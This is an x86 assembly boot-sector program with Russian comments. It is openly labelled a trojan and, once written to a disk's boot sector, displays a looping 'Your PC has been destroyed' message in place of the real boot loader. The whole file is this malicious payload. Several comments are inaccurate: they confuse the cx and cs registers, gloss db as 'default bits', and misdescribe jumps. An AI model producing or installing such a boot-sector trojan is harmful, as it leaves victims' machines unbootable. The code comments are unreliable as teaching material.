BITS    16							;16-разрядный режим (при старте ПК)
ORG     0x7c00						;Адрес BIOS'a 
jmp start							;Перепрыгиваем на метку start


start:								;Метка start
		cmp bh, 0xFF
		je @IfBhEqualsF
		jmp @IfBhNotEqualsF
@IfBhEqualsF:
		mov bh, 0x00
        call clear_screen			;Вызываем метод clear_screen
        mov ax,cs					;Заносим в регистр ax содержимое регистра cx	(P.s. а в cx у нас лежит 0x0000)
        mov ds,ax					;Заносим в регистр ds содержимое регистра ax	(P.s. в ax лежит 0x0000)
        mov si,msg					;заносим в регистр si переменную msg			(P.s. значение из msg)

        call print	
@IfBhNotEqualsF:
		add bh, 0x01
        call clear_screen			;Вызываем метод clear_screen
        mov ax,cs					;Заносим в регистр ax содержимое регистра cx	(P.s. а в cx у нас лежит 0x0000)
        mov ds,ax					;Заносим в регистр ds содержимое регистра ax	(P.s. в ax лежит 0x0000)
        mov si,msg					;заносим в регистр si переменную msg			(P.s. значение из msg)

        call print					;Вызываем функцию print

print:								;Метка print
        push ax						;Размещаем в памяти значение из регистра ax
        cld							;Очистка флага направления
next:								;Метка next
        mov al,[si]					;Помещаем в регистр al адрес смещения (si)			;Пока в al не будет ничего, функция не остановится
        cmp al,0					;Сравниваем значение из регистра al с 0
        je done						;Если al = 0, то переходим к метке done
        call printchar				;Вызываем printchar
        inc si						;Прибавляем к значению в регистре si 1
        jmp next					;Перепрыгиваем к метке next
done:								;Метка done
        jmp start					;Переходим к start								(P.s. $ означает адрес выполняемой в данный момент инструкции)

printchar:							;Метка printchar
		
        mov ah,0x0e					;Заносим в регистр ah 0x0e						(P.s. в ah лежит функция для прерывания 0x10, 0x0e - печатает 1 символ, переносит курсор на следующую позицию);
        int 0x10					;Выводим на экран значение из регистра al, столько раз, сколько указанно в регистре cx, цвета bh
        ret							;Выходим из функции
		
																				;{														;{
clear_screen:						;Метка clear_screen 						;ax = 0x0700 	- 	 функция для прокрутки окна			;			
        mov ah, 0x07				;Загружаем значение в ah					;}														;
        mov al, 0x00				;Загружаем в регистр al ничего																		;Изменяем цвет выводимого текста
        ;mov bh, 0xCB 				;Цвет выводимого текста и фона																				;
        mov cx, 0x0000 				;Строка = 0, стобец = 0																				;
        mov dx, 0x184f				;Строка = 24, столбец = 79																		;
        int 0x10					;Вызываем прерывание для изменение цвета выводимого текста в 16-ти разрядном режиме					;}
        ret						;Вызываем функцию print


msg:            db        "Your PC has been destroyed by Noimage Png",13,10,"Enjoy This beautiful text and colorful background) ",13,10,"Thanks for launnched this trojan.",13,10,"Good Luck ;)  : )  :3",0					;Кладём в переменную msg битвую строку					(P.s. db = default bits, ...,13,10,... - перенос каретки и переход на следующую строку)
times 510 - ($-$$) db 0															;(P.s. $-$$ - вы получите смещение от начала до адреса выполняемой в данный момент инструкции, $$ означает первый адрес текущего раздела, db - default bits, 510 - 510'ый байт)
dw        0xaa55																;Помещаем сигнатуру 0xaa55 в конец 0-вого сектора диска (AA 55 = UЄ)


